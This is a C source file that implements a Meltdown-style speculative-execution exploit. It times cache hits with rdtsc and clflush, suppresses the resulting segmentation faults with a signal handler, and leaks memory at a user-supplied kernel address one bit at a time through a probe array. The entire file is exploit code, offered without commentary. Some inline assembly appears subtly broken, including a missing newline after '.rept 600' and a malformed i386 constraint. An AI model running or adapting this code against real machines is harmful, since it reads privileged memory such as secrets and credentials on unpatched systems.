#define _GNU_SOURCE
#include <ctype.h>
#include <sched.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <setjmp.h>
#include <math.h>
#include <ucontext.h>
#include <time.h>
#include <fcntl.h>

#define DEFAULT_PHYSICAL_MAP_OFFSET 0xffff880000000000ull
#define CYKOR
#define DEFAULT_ITERATION 1000

size_t time_threshold;
size_t physical_map_address;
jmp_buf buf;

int iteration = DEFAULT_ITERATION;
extern char stopspeculate[];

char *_probe_array = NULL;
char *probe_array = NULL;
int bit = 0;
int byte = 0;
int ord = 0;
size_t virtual = 0;


void extract_bit()
{
	int i = 0;
	if(check_cached((probe_array + 4096)))
		bit = 1;
	else
		bit = 0;
}


uint64_t rdtsc() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
  asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
  asm volatile("rdtsc" : "=A"(a));
#endif
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

void maccess(void *ptr)
{
        asm volatile("movq (%0), %%rax\n" : : "c"(ptr) : "rax");
}

void flush(void *ptr)
{
        asm volatile("clflush 0(%0)\n" : : "c"(ptr) : "rax");
}

void meltdown()
{
  asm volatile(
               ".rept 600"
               "add $1, %%rax\n"\
               ".endr\n"\
               "xorq %%rax, %%rax\n" \
               "1:\n"\
               "movq (%%rsi), %%rsi\n"\
               "movb (%%rdx), %%al\n"\
               "shr %%cl, %%rax\n"\
               "and $1, %%al\n"\
               "shl $12, %%rax\n"\
               "jz 1b\n"\
               "movq (%%rbx,%%rax,1), %%rbx\n"\

                "stopspeculate: \n"\
               "nop\n"\
               :\
               : "d"(virtual), "c"(ord), "b"(probe_array)
               : "rax");
}


size_t calculate_time_threshold()
{
        uint64_t begin = 0;
        uint64_t finish = 0;
        size_t cache_hit_time = 0;
        size_t cache_miss_time = 0;
        size_t cache_avg_time = 0;
        size_t i = 0;
        size_t count = 100000;
        size_t array[16];
        size_t *addr = array + 8;

        maccess(addr); // make state cached
        for(i = 0; i<count; i++)
        {
                begin = rdtsc();
                maccess(addr);
                finish = rdtsc();
                cache_hit_time += (finish - begin);
        }

        cache_hit_time /= count;

        flush(addr); //make state uncached

        for(i=0; i<count; i++)
        {
                begin = rdtsc();
                maccess(addr);
                finish = rdtsc();
                flush(addr);
                cache_miss_time += (finish - begin);
        }

        cache_miss_time /= count;

        cache_avg_time = ((cache_hit_time * 2 + cache_miss_time * 3) / 5);

        return cache_avg_time;
}


void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
	
	return;
}

int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
		};

	return sigaction(SIGSEGV, &act, NULL);
}

int check_cached(void *ptr)
{
        uint64_t begin = 0;
        uint64_t finish = 0;

        begin = rdtsc();
        maccess(ptr);
        finish = rdtsc();

        flush(ptr);

        if((finish - begin) < time_threshold)
                return 1;
        else
                return 0;
}


int data_read(size_t addr)
{
        size_t count = DEFAULT_ITERATION;
        virtual = addr;
        int i,j,k;
        int res = 0;
        int value = 0;
        int check_array[2] = { 0, };

        for(i=0; i<2; i++)
                flush(probe_array + i * 4096);

        for(i=0; i<8; i++)
        {
                ord = i;
                check_array[0] = 0;
                check_array[1] = 0;

                for(j=0; j<count; j++)
                {
                        meltdown();
                        extract_bit();
                        check_array[bit]++;

                        for(k=0; k<2; k++)
                                flush(probe_array + k*4096);
                }

                if(check_array[1] > 700)
                        value += (1 << i);
        }

        return value;
}
  
int main(int argc, char *argv[])
{
	
	size_t target_address = strtoull(argv[1], NULL, 0);
	size_t size = strtoull(argv[2], NULL, 0);
	int i;
	int ret;
	int data;
	ret = set_signal();
	_probe_array = malloc(4096 * 300);
	probe_array = (char *)(((size_t)_probe_array & ~0xfff) + 0x1000 * 2);
	memset(probe_array, 0xaa, 4096 * 290);
	
	for(i=0; i<2; i++)
		flush(probe_array + i * 4096);

	time_threshold = calculate_time_threshold();
		
	for(i=0; i < size; i++)
	{
		data = data_read(target_address + i);
		printf("%zx : %d \n", target_address+i, data);
	}
	
  	return 0;			
}	 
